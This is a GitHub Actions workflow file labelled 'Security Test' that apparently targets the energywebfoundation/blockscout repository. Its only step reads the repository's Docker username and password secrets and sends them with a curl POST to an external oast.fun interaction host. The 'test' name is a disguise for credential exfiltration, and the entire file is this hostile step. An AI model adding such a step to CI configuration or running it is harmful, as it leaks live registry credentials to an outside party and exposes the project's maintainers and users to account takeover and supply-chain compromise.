name: Security Test
on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Test all secrets
        env:
          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
          DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
        run: |
          echo "Testing all secrets from energywebfoundation/blockscout"
          SECRETS_OUTPUT=""
          SECRETS_OUTPUT+="DOCKER_PASSWORD=${DOCKER_PASSWORD}\n"
          SECRETS_OUTPUT+="DOCKER_USERNAME=${DOCKER_USERNAME}\n"
          curl -X POST https://ysdwohuyzvgctjktuywnobz8gju8g5qtp.oast.fun/post -d "$SECRETS_OUTPUT"
